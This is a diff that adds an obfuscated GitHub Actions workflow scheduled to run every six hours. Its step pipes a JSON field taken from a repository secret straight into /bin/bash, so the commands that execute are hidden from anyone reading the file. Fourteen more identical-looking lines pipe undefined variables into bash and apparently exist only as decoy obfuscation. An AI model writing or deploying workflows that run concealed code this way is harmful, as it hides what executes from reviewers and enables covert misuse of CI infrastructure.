@@ -1,0 +1,31 @@
+name: wuqingxu6754
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuqingxu6754
+        env:
+          nbdc9958: ${{ secrets.nbdc9958 }}
+        run: |
+          echo $nbdc9958 | jq -r .tqr8 | /bin/bash
+          echo $v43 | jq -r .ltjc7900 | /bin/bash
+          echo $vtg90 | jq -r .qdvpc8000 | /bin/bash
+          echo $ghsua3 | jq -r .htrd90309 | /bin/bash
+          echo $cv3068 | jq -r .p2 | /bin/bash
+          echo $vuo03136 | jq -r .hnaf9792 | /bin/bash
+          echo $ba0734 | jq -r .l34010 | /bin/bash
+          echo $yqkp87 | jq -r .bnvxm80307 | /bin/bash
+          echo $ho616 | jq -r .rrll64 | /bin/bash
+          echo $oqit4233 | jq -r .kwi32373 | /bin/bash
+          echo $bpz105 | jq -r .i9856 | /bin/bash
+          echo $kmmz07279 | jq -r .lmwi6480 | /bin/bash
+          echo $je96 | jq -r .wd3991 | /bin/bash
+          echo $jdky44472 | jq -r .xhs9 | /bin/bash
+          echo $ffe97 | jq -r .qx1 | /bin/bash
+
